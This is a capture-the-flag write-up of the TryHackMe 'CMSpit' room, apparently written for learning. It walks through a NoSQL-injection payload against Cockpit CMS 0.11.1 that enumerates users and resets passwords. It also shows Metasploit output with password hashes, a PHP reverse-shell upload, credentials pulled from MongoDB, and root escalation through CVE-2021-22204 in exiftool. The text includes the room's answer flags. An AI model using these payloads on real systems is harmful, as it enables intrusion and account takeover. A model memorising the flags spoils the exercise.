# CMSpit
## export IP=10.10.240.11
 
 > Konstantinos Pap - Fri 06 Aug 2021 07:47:38 AM CDT


My script initialized all kinds of enumerations (gobuster, nikto and nmap)
Nmap detected 2 open ports. port 22 and 80.
Opening firefox on the server we get a login page. No matter what we type in we always end up on the login page. This means we need to authenticate or bypass the authentication somehow.

First thing i tried was default creds like admin:admin admin:password user:password etc. This got me nowhere so i tried to bypass it using basic SQL injection techniques such as admin' OR '1'='1. This didn't work either so i needed another way to get in. I started looking the tryhackme questions and try to answer as many as i could at the time. 

## What is the name of the Content Management System (CMS) installed on the server?
Cockpit

## What is the version of the Content Management System (CMS) installed on the server?
From the source code of the login page i found out that the version of the js files is 0.11.1

## What is the path that allow user enumeration?
/auth/check
User enumeration ?.. Time to visit my old friend searchsploit...
```
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery     | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                   | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery (Unauthen | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery          | php/webapps/47305.py
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```

A remote code execution exploit would definitely be nice but it is outdated. The version we are targeting is 0.11.1 and this exploit works for 0.6.1
So we'll start googling instead
Packet storm has an exploit for 0.11.1 version of cockpit. Let's check it out and recreate it. The basic idea of the exploit is that we can inject NOSQL commands and retrieve the results back to the console. 

Sending this request through burp suite to the /auth/resetpassword uri, we can see all the users in the database
`{ "user" : { "$func": "var_dump" } }`
And the users are: 
```

string(5) "admin"
string(12) "darkStar7471"
string(5) "skidy"
string(8) "ekoparty"

```

We can change the password of admin using this CVE. We first need to get a reset token for the user we want to change the password
We can achieve that using this command to /auth/resetpassword uri:
`{ 'token' : { '$func' : 'var_dump' } }`

We then get a reset token
`rp-8070385923502d710d87f00b60a67193610d5de20d873` 
which we can use at /auth/resetpassword like this
`{ "token" : "rp-8070385923502d710d87f00b60a67193610d5de20d873","password":"test123" }`
### This process can help us reset any user we want. Let's make a python script to automate it.
So i automated the steps in a python script pretty easily and with a single execution we should have custom creds for any user we want!
Just execute `python3 exploit_cockpit_0.11.1.py` and watch it hack the cms for you :P

### Metasploit module results:

For Admin
```
[*] Started reverse TCP handler on 10.8.135.205:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23"]
[*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to 5vOeafyK23
[+] Password update successful
```
For Skiddy
```
[*] Started reverse TCP handler on 10.8.135.205:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[*] Attempting to generate tokens
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-965b71dcb790d2d0a9924f9d0c204ea0610d4a41292c6"]
[*] Checking token: rp-965b71dcb790d2d0a9924f9d0c204ea0610d4a41292c6
[*] Obtaining user info
[*]   user: skidy
[*]   email: skidy@tryhackme.fakemail
[*]   active: true
[*]   group: admin
[*]   i18n: en
[*]   api_key: account-21ca3cfc400e3e565cfcb0e3f6b96d
[*]   password: $2y$10$uiZPeUQNErlnYxbI5PsnLurWgvhOCW2LbPovpL05XTWY.jCUave6S
[*]   name: Skidy
[*]   _modified: 1621719311
[*]   _created: 1621719311
[*]   _id: 60a9790f393037a2e400006a
[*]   _reset_token: rp-965b71dcb790d2d0a9924f9d0c204ea0610d4a41292c6
[*]   md5email: 5dfac21f8549f298b8ee60e4b90c0e66
[+] Changing password to jkU4jD36bc
[+] Password update successful
```

## How many users can you identify when you reproduce the user enumeration attack?
4

## What is the path that allows you to change user account passwords?
/auth/resetpassword

## Compromise the Content Management System (CMS). What is Skidy's email.
We can get skidy's email either using the metasploit module or just simply log in via skidy's account and look at his account details.
skidy@tryhackme.fakemail

## What is the web flag?
I managed to log in with admin:admin that i generated earlier. Now we need to do some reconnaissance to find the web flag.
In the finder menu we can view the file system. There is a webflag.php file that contains the flag.
$flag = "thm{f158bea70731c48b05657a02aaf955626d78e9fb}";

## Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?
Now we need to find a way to get into the machine.
I found this endpoint that can upload and access with direct link files. Let's uplaod a php reverse shell and get ourselves a shell.

I wrote a simple reverse shell in php in the php_rev.php file since my reverse.php shell was not returning anything.
This gives me code execution and apparently i am www-data
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
Let's get an actual shell though
i'll use a python script from my misc payloads.
We can enter the mongo cli by typing mongo. Our flag will be stored there.
There are 3 databases on the machine 
```
> show dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB

```
We'll try local.
`use local`
Local seems empty
Let's switch to sudousersbak
```
> use sudousersbak
> show collections
flag
system.indexes
user
```
We need to view this flag.
```
> db.flag.find()
{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}" }
```

## What is the user.txt flag?
And viewing the user collection we get the user password to escalate on the machine
```
> db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }

```
And now i am stux `uid=1000(stux) gid=1000(stux) groups=1000(stux),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)`
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}

## What is the CVE number for the vulnerability affecting the binary assigned to the system user? Answer format: CVE-0000-0000
We can see by running sudo -l that we can sudo run without a password exiftool..
```
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```
Recently though there was a vulnerability disclosure on exiftool. Let's see if this is the vulnerable version!
The machine is running exiftool 12.05 and the vulnerability is affecting everything from 7.4 and up until 12.24 which means this is vulnerable and since we can run it as sudo we can get priviledge escalation fairly easily
```
stux@ubuntu:~$ exiftool -ver
12.05
```

The CVE number is CVE-2021-22204

## What is the utility used to create the PoC file?
We will use the djvumake utility to generate the payload.

## Escalate your privileges. What is the flag in root.txt?
This blog explains the vulnerability pretty well
https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/

Let's recreate it in a script and execute it.
```
stux@ubuntu:~$ ls
configfile           exploit.djvu  image.jpeg_original  payload.bzz
exiftool_exploit.sh  image.jpeg    payload              user.txt
stux@ubuntu:~$ chmod +x exiftool_exploit.sh
stux@ubuntu:~$ ./exiftool_exploit.sh 
Preparing payload
Preparing exploit
Writing exploit
    1 image files updated
Executing exploit
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# 
```
And we are root!
thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
